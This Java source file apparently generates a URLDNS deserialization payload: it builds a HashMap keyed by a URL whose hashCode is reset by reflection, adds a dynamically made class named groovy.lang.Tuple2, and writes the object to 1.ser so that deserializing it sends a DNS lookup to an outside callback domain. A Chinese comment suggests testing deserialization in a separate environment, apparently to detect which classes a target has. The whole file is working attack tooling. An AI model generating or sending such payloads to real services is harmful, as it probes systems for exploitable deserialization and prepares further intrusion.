package com.yso;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;
import javassist.ClassPool;
import javassist.CtClass;

public class urldns {
    public static Class makeClass(String clazzName) throws Exception {
        CtClass ctClass = ClassPool.getDefault().makeClass(clazzName);
        Class clazz = ctClass.toClass();
        ctClass.defrost();
        return clazz;
    }

    public static void main(String[] argv) throws Exception {
        HashMap hashMap = new HashMap();
        URL url = new URL("http://cc5.6f5693.dns.bypass.eu.org");
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, 0);
        hashMap.put(url, makeClass("groovy.lang.Tuple2"));
        f.set(url, -1);
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("1.ser"));
        oos.writeObject(hashMap);
        //动态生成的类也可以被反序列化，1.ser的序列化和反序列化最好分开在两个不同的环境测试
        //ObjectInputStream ois = new ObjectInputStream(new FileInputStream("1.ser"));
        //ois.readObject();
    }
}
